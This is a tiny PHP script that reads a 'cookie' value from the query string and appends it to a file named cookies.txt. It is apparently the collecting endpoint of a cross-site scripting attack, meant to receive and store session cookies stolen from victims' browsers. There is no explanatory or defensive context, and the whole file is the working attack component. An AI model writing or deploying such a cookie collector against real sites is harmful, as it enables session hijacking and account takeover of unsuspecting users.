<?php
    //echo $_GET['cookie'];
    $fp = fopen('cookies.txt', 'a') or die("Unable to open file!");
    fwrite($fp, $_GET['cookie'] . PHP_EOL);
    fclose($fp);
?>